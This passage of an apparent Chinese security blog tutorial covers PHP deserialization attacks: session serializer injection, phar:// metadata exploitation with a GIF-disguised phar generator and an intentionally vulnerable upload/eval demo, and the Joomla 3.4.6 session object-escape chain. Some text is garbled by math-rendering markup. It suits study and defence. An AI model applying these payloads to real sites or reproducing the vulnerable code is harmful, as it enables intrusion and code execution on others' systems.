class=\"line\">我们只需要在前面加个|</span><br><span class=\"line\">|O:4:&quot;user&quot;:2:&#123;s:4:&quot;name&quot;;s:7:&quot;bmjoker&quot;;s:3:&quot;age&quot;;s:3:&quot;888&quot;;&#125;</span><br><span class=\"line\">此时session中的username的值为</span><br><span class=\"line\">|O:4:&quot;user&quot;:2:&#123;s:4:&quot;name&quot;;s:7:&quot;bmjoker&quot;;s:3:&quot;age&quot;;s:3:&quot;888&quot;;&#125;</span><br><span class=\"line\">使用php引擎读取时</span><br><span class=\"line\">|后面的全部会变成value值</span><br><span class=\"line\">就可以出发__wakeup魔法方法</span><br></pre></td></tr></table></figure>\n<p>但这种方法是在可以对<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mrow></mrow><mi>S</mi></msub><mi>E</mi><mi>S</mi><mi>S</mi><mi>I</mi><mi>O</mi><mi>N</mi><mtext>进行赋值的情况下实现的，那如果代码中不存在对</mtext></mrow><annotation encoding=\"application/x-tex\">_SESSION进行赋值的情况下实现的，那如果代码中不存在对</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.83333em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span></span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.32833099999999993em;\"><span style=\"top:-2.5500000000000003em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.05764em;\">S</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord mathnormal\" style=\"margin-right:0.05764em;\">E</span><span class=\"mord mathnormal\" style=\"margin-right:0.05764em;\">S</span><span class=\"mord mathnormal\" style=\"margin-right:0.05764em;\">S</span><span class=\"mord mathnormal\" style=\"margin-right:0.07847em;\">I</span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">O</span><span class=\"mord mathnormal\" style=\"margin-right:0.10903em;\">N</span><span class=\"mord cjk_fallback\">进</span><span class=\"mord cjk_fallback\">行</span><span class=\"mord cjk_fallback\">赋</span><span class=\"mord cjk_fallback\">值</span><span class=\"mord cjk_fallback\">的</span><span class=\"mord cjk_fallback\">情</span><span class=\"mord cjk_fallback\">况</span><span class=\"mord cjk_fallback\">下</span><span class=\"mord cjk_fallback\">实</span><span class=\"mord cjk_fallback\">现</span><span class=\"mord cjk_fallback\">的</span><span class=\"mord cjk_fallback\">，</span><span class=\"mord cjk_fallback\">那</span><span class=\"mord cjk_fallback\">如</span><span class=\"mord cjk_fallback\">果</span><span class=\"mord cjk_fallback\">代</span><span class=\"mord cjk_fallback\">码</span><span class=\"mord cjk_fallback\">中</span><span class=\"mord cjk_fallback\">不</span><span class=\"mord cjk_fallback\">存</span><span class=\"mord cjk_fallback\">在</span><span class=\"mord cjk_fallback\">对</span></span></span></span>_SESSION 变量赋值的情况下又该如何利用？</p>\n<p>在 PHP 中还存在一个 upload_process 机制，即自动在 $_SESSION 中创建一个键值对（key:value），value 中刚好存在用户可控的部分，可以看下官方描述的，这个功能在文件上传的过程中利用 session 实时返回上传的进度。</p>\n<h4 id=\"phar伪协议触发php反序列化\"><a class=\"markdownIt-Anchor\" href=\"#phar伪协议触发php反序列化\">#</a> phar 伪协议触发 php 反序列化</h4>\n<p>通常我们在利用反序列化漏洞的时候，只能将序列化后的字符串传入 unserialize ()，随着代码安全性越来越高，利用难度也越来越大。但在不久前的 Black Hat 上提出利用 phar 文件会以序列化的形式存储用户自定义的 meta-data 这一特性，拓展了 php 反序列化漏洞的攻击面。该方法在文件系统函数（file_exists ()、is_dir () 等）参数可控的情况下，配合 phar:// 伪协议，可以不依赖 unserialize () 直接进行反序列化操作。</p>\n<p><strong>phar 介绍和漏洞原理</strong></p>\n<p>phar 就是 php 压缩文档。它可以把多个文件归档到同一个文件中，而且不经过解压就能被 php 访问并执行，与 file://，php:// 等类似，也是一种流包装器。</p>\n<p><strong>phar 文件有四部分构成</strong>：</p>\n<p><strong>1. a stub</strong></p>\n<p>识别 phar 拓展的标识，格式为：xxx<?php xxx; __HALT_COMPILER();?>，对应的函数 Phar::setStub。前期内容不限，但必须以 __HALT_COMPILER ();?&gt; 结尾，否则 phar 扩展将无法识别这个文件为 phar 文件。</p>\n<p><strong>2. a manifest describing the contents</strong></p>\n<p>phar 文件本质上是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分还会以序列化的形式存储用户自定义的 meta-data，这是漏洞利用的核心部分。对应函数 Phar::setMetadata— 设置 phar 归档元数据。</p>\n<p><strong>3. the file contents</strong></p>\n<p>被压缩文件的内容。</p>\n<p><strong>4. [optional] a signature for verifying Phar integrity (phar file format only)</strong></p>\n<p>签名，放在文件末尾。对应函数 Phar :: stopBuffering— 停止缓冲对 Phar 存档的写入请求，并将更改保存到磁盘。</p>\n<p><strong>这里有两个关键点：</strong></p>\n<ol>\n<li>\n<p><strong>文件标识</strong>，必须以 __HALT_COMPILER ();?&gt; 结尾，但前面的内容没有限制，也就是说我们可以轻易伪造一个图片文件或者 pdf 文件来绕过一些上传限制</p>\n</li>\n<li>\n<p><strong>反序列化</strong>，phar 存储的 meta-data 信息以序列化方式存储，当文件操作函数通过 phar:// 伪协议解析 phar 文件时，文件内容会被解析成 phar 对象，然后 phar 对象内的 meta-data 会被反序列化。</p>\n</li>\n</ol>\n<p>meta-data 是用 serialize () 生成并保存在 phar 文件中，当内核调用 phar_parse_metadata () 解析 meta-data 数据时，会调用 php_var_unserialize () 对其进行反序列化操作，因此会造成反序列化漏洞。</p>\n<p>而在一些上传点，我们可以更改 phar 的文件头并且修改其后缀名绕过检测，如：test.gif，里面的 meta-data 却是我们提前写入的恶意代码，而且可利用的文件操作函数又很多，所以这是一种不错的绕过 + 执行的方法。</p>\n<p>生成 phar 文件的代码如下：</p>\n<p>phar.php</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">    //反序列化payload构造</span><br><span class=\"line\">    class TestObject &#123;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    @unlink(&quot;phar.phar&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">    //实例一个phar对象供后续操作，后缀名必须为phar</span><br><span class=\"line\">    $phar = new Phar(&quot;phar.phar&quot;); </span><br><span class=\"line\">    //开始缓冲对phar的写操作 </span><br><span class=\"line\">    $phar-&gt;startBuffering();</span><br><span class=\"line\">    </span><br><span class=\"line\">    //设置识别phar拓展的标识stub，必须以 __HALT_COMPILER(); ?&gt; 结尾</span><br><span class=\"line\">    $phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); </span><br><span class=\"line\"></span><br><span class=\"line\">    //将反序列化的对象放入该文件中</span><br><span class=\"line\">    $o = new TestObject();</span><br><span class=\"line\">    $o-&gt;data=&#x27;i am bmjoker&#x27;;</span><br><span class=\"line\">    //将自定义的归档元数据meta-data存入manifest</span><br><span class=\"line\">    $phar-&gt;setMetadata($o);</span><br><span class=\"line\"></span><br><span class=\"line\">    //phar本质上是个压缩包，所以要添加压缩的文件和文件内容</span><br><span class=\"line\">    $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;bmjoker&quot;); </span><br><span class=\"line\">    //停止缓冲对phar的写操作</span><br><span class=\"line\">    $phar-&gt;stopBuffering();</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n<p>可以明显的看到 meta-data 是以序列化的形式存储的，有序列化数据必然会有反序列化操作，php 一大部分的文件系统函数在通过 phar:// 伪协议解析 phar 文件时，都会将 meta-data 进行反序列化，测试后受影响的函数如下：</p>\n<table>\n<thead>\n<tr>\n<th><em><strong>* 受影响的文件操作函数列表 *</strong></em></th>\n<th>** **</th>\n<th></th>\n<th></th>\n<th></th>\n<th></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>fileatime</td>\n<td>filectime</td>\n<td>file_exists</td>\n<td>file_get_contents</td>\n<td>touch</td>\n<td>get_meta_tags</td>\n</tr>\n<tr>\n<td>file_put_contents</td>\n<td>file</td>\n<td>filegroup</td>\n<td>fopen</td>\n<td>hash_file</td>\n<td>get_headers</td>\n</tr>\n<tr>\n<td>fileinode</td>\n<td>filemtime</td>\n<td>fileowner</td>\n<td>fileperms</td>\n<td>md5_file</td>\n<td>getimagesize</td>\n</tr>\n<tr>\n<td>is_dir</td>\n<td>is_executable</td>\n<td>is_file</td>\n<td>is_link</td>\n<td>sha1_file</td>\n<td>getimagesizefromstring</td>\n</tr>\n<tr>\n<td>is_readable</td>\n<td>is_writable</td>\n<td>is_writeable</td>\n<td>parse_ini_file</td>\n<td>hash_update_file</td>\n<td>imageloadfont</td>\n</tr>\n<tr>\n<td>copy</td>\n<td>unlink</td>\n<td>stat</td>\n<td>readfile</td>\n<td>hash_hmac_file</td>\n<td>exif_imagetype</td>\n</tr>\n</tbody>\n</table>\n<p>这些函数里面可以使用 phar 协议，当然还有常用的文件包含的几个函数 include、include_once、requrie、require_once</p>\n<p>对刚才生成的 phar 使用文件操作函数实现反序列化读取：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">    class TestObject&#123;</span><br><span class=\"line\">        function __destruct()&#123;</span><br><span class=\"line\">            echo $this-&gt;data;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    $filename =  &quot;phar://phar.phar/test.txt&quot;;</span><br><span class=\"line\">    file_get_contents($filename);</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n<h4 id=\"0x10\"><a class=\"markdownIt-Anchor\" href=\"#0x10\">#</a> 0x10</h4>\n<p>upload_file.php：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">if (($_FILES[&quot;file&quot;][&quot;type&quot;]==&quot;image/gif&quot;)&amp;&amp;(substr($_FILES[&quot;file&quot;][&quot;name&quot;], strrpos($_FILES[&quot;file&quot;][&quot;name&quot;], &#x27;.&#x27;)+1))== &#x27;gif&#x27;) &#123;</span><br><span class=\"line\">    echo &quot;Upload: &quot; . $_FILES[&quot;file&quot;][&quot;name&quot;];</span><br><span class=\"line\">    echo &quot;Type: &quot; . $_FILES[&quot;file&quot;][&quot;type&quot;];</span><br><span class=\"line\">    echo &quot;Temp file: &quot; . $_FILES[&quot;file&quot;][&quot;tmp_name&quot;];</span><br><span class=\"line\">    if (file_exists(&quot;upload_file/&quot; . $_FILES[&quot;file&quot;][&quot;name&quot;]))&#123;</span><br><span class=\"line\">        echo $_FILES[&quot;file&quot;][&quot;name&quot;] . &quot; already exists. &quot;;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    else</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;],&quot;upload_file/&quot; .$_FILES[&quot;file&quot;][&quot;name&quot;]);</span><br><span class=\"line\">        echo &quot;Stored in: &quot; . &quot;upload_file/&quot; . $_FILES[&quot;file&quot;][&quot;name&quot;];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">else&#123;</span><br><span class=\"line\">    echo &quot;Invalid file,you can only upload gif&quot;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n<p>upload_file.html</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;body&gt;</span><br><span class=\"line\">&lt;form action=&quot;http://127.0.0.1/upload_file.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class=\"line\">    &lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt;</span><br><span class=\"line\">    &lt;input type=&quot;submit&quot; name=&quot;Upload&quot; /&gt;</span><br><span class=\"line\">&lt;/form&gt;</span><br><span class=\"line\">&lt;/body&gt;</span><br></pre></td></tr></table></figure>\n<p>file_un.php</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">$filename=$_GET[&#x27;filename&#x27;];</span><br><span class=\"line\">class AnyClass&#123;</span><br><span class=\"line\">    var $output = &#x27;echo &quot;ok&quot;;&#x27;;</span><br><span class=\"line\">    function __destruct()</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        eval($this -&gt; output);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">file_exists($filename);   // 漏洞点</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n<p>upload_file.php 对上传文件的类型，后缀进行了判断，限制为 GIF 文件。而 file_un.php 文件主要使用 file_exists () 判断文件是否存在，并且存在魔术方法__destruct ()。大概思路为首先根据 file_un.php 写一个生成 phar 的 php 文件，当然需要绕过为 gif 的限制，所以需要加 GIF89a，然后我们访问这个 php 文件后，生成了 phar.phar，修改后缀为 gif，上传到服务器，然后利用 file_exists，使用 phar:// 执行代码。</p>\n<p>构造 payload 代码 eval.php：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">class AnyClass&#123;</span><br><span class=\"line\">    var $output = &#x27;echo &quot;ok&quot;;&#x27;;</span><br><span class=\"line\">    function __destruct()</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        eval($this -&gt; output);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">$phar = new Phar(&#x27;phar.phar&#x27;);</span><br><span class=\"line\">$phar -&gt; startBuffering();</span><br><span class=\"line\">$phar -&gt; setStub(&#x27;GIF89a&#x27;.&#x27;&lt;?php __HALT_COMPILER();?&gt;&#x27;);</span><br><span class=\"line\">$phar -&gt; addFromString(&#x27;test.txt&#x27;,&#x27;test&#x27;);</span><br><span class=\"line\">$object = new AnyClass();</span><br><span class=\"line\">$object -&gt; output= &#x27;phpinfo();&#x27;;</span><br><span class=\"line\">$phar -&gt; setMetadata($object);</span><br><span class=\"line\">$phar -&gt; stopBuffering();</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n<p>访问 eval.php，会在当前目录生成 phar.phar，然后修改后缀 gif</p>\n<p><strong>漏洞利用条件</strong></p>\n<p>\\1. phar 文件要能够上传到服务器端（如 GET、POST），并且要有 file_exists ()，fopen ()，file_get_contents ()，include () 等文件操作的函数</p>\n<p>\\2. 要有可用的魔术方法作为 &quot;跳板&quot;；</p>\n<p>\\3. 文件操作函数的参数可控，且：，/，phar 等特殊字符没有被过滤。</p>\n<p>虽然某些函数能够支持 phar:// 的协议，但是如果目标服务器没有关闭 phar.readonly 时，就不能正常执行反序列化操作。</p>\n<p><strong>在禁止 phar 开头的情况下的替代方法:</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">compress.zlib://phar://phar.phar/test.txt</span><br><span class=\"line\"></span><br><span class=\"line\">compress.bzip2://phar://phar.phar/test.txt </span><br><span class=\"line\"></span><br><span class=\"line\">php://filter/read=convert.base64-encode/resource=phar://phar.phar/test.txt</span><br></pre></td></tr></table></figure>\n<p>虽然会报 warning，但是还是会执行。</p>\n<h3 id=\"joomla-346对象逃逸反序列化执行\"><a class=\"markdownIt-Anchor\" href=\"#joomla-346对象逃逸反序列化执行\">#</a> Joomla  3.4.6 对象逃逸反序列化执行</h3>\n<p>Joomla 反序列化漏洞的主要原因是：</p>\n<blockquote>\n<p>Joomla 不论账号密码是否正确，都会把登录的用户名和密码，通过序列化的方式存储在 session 表中，再以反序列化的方式读取 session 表中的内容。由于 protected 修饰的变量在序列化的时候，会变成 \\x00 + * + \\x00 + [变量名] 的形式，而 mysql 无法保存 NULL 字节的数据，所以在向 session 表写入的过程中会将 \\x00*\\x00 替换为 \\0\\0\\0 ，同样在读取 session 表中的内容的时候会再次转换，然后进行反序列化。如果在向 session 表存储的过程中构造恶意构造一些 \\0\\0\\0，那么在进行反序列化的时候就会由于字节数对不上，导致 “溢出” ，使得反序列化对象逃逸出来。</p>\n</blockquote>\n<p>如果上面这段没看懂，可以看上面利用章节的对象逃逸，如果还看不懂就退学吧</p>\n<p>尝试使用错误的账号密码登录，查看一下 session 表中的内容：</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1344396-20201028001846145-1227489260.png\" alt=\"img\"></p>\n<p>在登录过程中，会有一个 303 的跳转，这个跳转是先把用户的输入经过序列化存储在 session 表中，读取的时候再从 session 表中取出数据进行反序列化，进行账号密码对比</p>\n<p>通过序列化写入 session 表的具体代码如下：</p>\n<p>Joomla/libraries/joomla/session/storage/database.php ——&gt; write()</p>\n<p><a href=\"https://img2020.cnblogs.com/blog/1344396/202010/1344396-20201028225321914-653179029.png\"><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1344396-20201028225321914-653179029.png\" alt=\"img\"></a></p>\n<p>因为 protected 修饰的变量在序列化后会变成这种形式：\\x00 + * + \\x00 + [变量名]，而 mysql 无法保存 NULL 字节的数据，所以在代码中可以看到在写入 session 表的过程中会将 \\x00*\\x00 替换为 \\0\\0\\0 来进行存储，就比如 Registry 类下 protected 修饰的 $data 变量，序列化存储为：</p>\n<p><a href=\"https://img2020.cnblogs.com/blog/1344396/202010/1344396-20201028231208408-1317263109.png\"><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1344396-20201028231208408-1317263109.png\" alt=\"img\"></a></p>\n<p>通过反序列化读取 session 表的具体代码如下：</p>\n<p>Joomla/libraries/joomla/session/storage/database.php ——&gt; read()</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1344396-20201028225519116-1363963610.png\" alt=\"img\"></p>\n<p>在读取时会重新把 \\0\\0\\0 替换为 \\x00*\\x00 来进行反序列化。</p>\n<p>因此反序列化存入 session 表中的数据比原始数据要多 3 个字节</p>\n<p>如果传入的用户名为 \\0\\0\\0admin，序列化写入 session 表中的数据为：</p>\n<p>在调用 read 方法进行读取时会先将 \\0\\0\\0 转换为 N*N（\\x00 为空字节为方便展示这里使用 N 代替）：</p>\n<p>\\0\\0\\0admin</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">s:8:&quot;username&quot;;s:11:&quot;N*Nadmin&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;</span><br></pre></td></tr></table></figure>\n<p>因为 read 之后长度变短了 3 个字节，在反序列化的时候 username 的值为 s:11:“N<em>Nadmin&quot;，但是实际只有 8 个字节，为了满足反序列化的规则，就会吃掉后面 3 个字节的数据，直至凑齐 11 个字符，也就是 s:11:&quot;N</em>Nadmin”;s。</p>\n<p>利用这个思路，足够多的 \\0\\0\\0 就可以将 password 字段的数据逃逸出来，构造如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">s:8:s:&quot;username&quot;;s:54:&quot;\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;</span><br></pre></td></tr></table></figure>\n<p>read () 之后：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">s:8:s:&quot;username&quot;;s:54:&quot;N*NN*NN*NN*NN*NN*NN*NN*NN*N&quot;;s:8:&quot;password&quot;;s:6:&quot;12345</span><br></pre></td></tr></table></figure>\n<p>username 的值为 N<em>NN</em>NN<em>NN</em>NN<em>NN</em>NN<em>NN</em>NN*N&quot;;s:8:“password”;s:6:&quot;12345，后面补上 &quot; 和；就成功逃逸出来了</p>\n<p>实现对象注入：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">s:8:s:&quot;username&quot;;s:54:&quot;N*NN*NN*NN*NN*NN*NN*NN*NN*N&quot;;s:8:&quot;password&quot;;s:6:&quot;12345&quot;;s:2:&quot;HS&quot;:O:15:&quot;ObjectInjection&quot;</span><br></pre></td></tr></table></figure>\n<p>这里来分析一下利用链，通过搜索 eval/assert/call_user_func… 这类可以利用并且参数可控的危险函数，可以找到用于构造执行链的类：</p>\n<p>这几个文件调取 call_user_func 的方式都相同，来看一下 libraries\\joomla\\database\\driver\\mysqli.php 中方法的具体实现</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221114210130490.png\" alt=\"image-20221114210130490\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1344396-20201031162618304-261047353.png\" alt=\"img\"></p>\n<p>当 JDatabaseDriverMysqli 这个类的对象被调用，在结束时都会调用析构函数__destruct，__destruct 中会调用 disconnect () 方法。</p>\n<p>而当<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>t</mi><mi>h</mi><mi>i</mi><mi>s</mi><mo>−</mo><mo>&gt;</mo><mi>c</mi><mi>o</mi><mi>n</mi><mi>n</mi><mi>e</mi><mi>c</mi><mi>t</mi><mi>i</mi><mi>o</mi><mi>n</mi><mtext>为</mtext><mi>t</mi><mi>r</mi><mi>u</mi><mi>e</mi><mtext>的时候，就会调用</mtext><mi>c</mi><mi>a</mi><mi>l</mi><msub><mi>l</mi><mi>u</mi></msub><mi>s</mi><mi>e</mi><msub><mi>r</mi><mi>f</mi></msub><mi>u</mi><mi>n</mi><msub><mi>c</mi><mi>a</mi></msub><mi>r</mi><mi>r</mi><mi>a</mi><mi>y</mi><mo stretchy=\"false\">(</mo></mrow><annotation encoding=\"application/x-tex\">this-&gt;connection为true的时候，就会调用call_user_func_array(</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.77777em;vertical-align:-0.08333em;\"></span><span class=\"mord mathnormal\">t</span><span class=\"mord mathnormal\">h</span><span class=\"mord mathnormal\">i</span><span class=\"mord mathnormal\">s</span><span class=\"mord\">−</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">&gt;</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1.036108em;vertical-align:-0.286108em;\"></span><span class=\"mord mathnormal\">c</span><span class=\"mord mathnormal\">o</span><span class=\"mord mathnormal\">n</span><span class=\"mord mathnormal\">n</span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\">c</span><span class=\"mord mathnormal\">t</span><span class=\"mord mathnormal\">i</span><span class=\"mord mathnormal\">o</span><span class=\"mord mathnormal\">n</span><span class=\"mord cjk_fallback\">为</span><span class=\"mord mathnormal\">t</span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">r</span><span class=\"mord mathnormal\">u</span><span class=\"mord mathnormal\">e</span><span class=\"mord cjk_fallback\">的</span><span class=\"mord cjk_fallback\">时</span><span class=\"mord cjk_fallback\">候</span><span class=\"mord cjk_fallback\">，</span><span class=\"mord cjk_fallback\">就</span><span class=\"mord cjk_fallback\">会</span><span class=\"mord cjk_fallback\">调</span><span class=\"mord cjk_fallback\">用</span><span class=\"mord mathnormal\">c</span><span class=\"mord mathnormal\">a</span><span class=\"mord mathnormal\" style=\"margin-right:0.01968em;\">l</span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.01968em;\">l</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.151392em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.01968em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">u</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord mathnormal\">s</span><span class=\"mord mathnormal\">e</span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">r</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3361079999999999em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.10764em;\">f</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.286108em;\"><span></span></span></span></span></span></span><span class=\"mord mathnormal\">u</span><span class=\"mord mathnormal\">n</span><span class=\"mord\"><span class=\"mord mathnormal\">c</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.151392em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">a</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">r</span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">r</span><span class=\"mord mathnormal\">a</span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">y</span><span class=\"mopen\">(</span></span></span></span>h, array(&amp;this)); 方法对disconnectHandlers数组中的每个值，都会执行call_user_func_array()，并将&this 作为参数引用，但是不能控制参数，所以不能直接构造 assert+eval 来执行任意代码。</p>\n<p>继续往下看发现在 libraries\\simplepie\\simplepie.php 中有一处 call_user_func 方法调用</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1344396-20201031171046685-27582232.png\" alt=\"img\"></p>\n<p>这个 call_user_func ($this-&gt;cache_name_function, <span class=\"katex\"><span class=\"katex-mathml\"><math 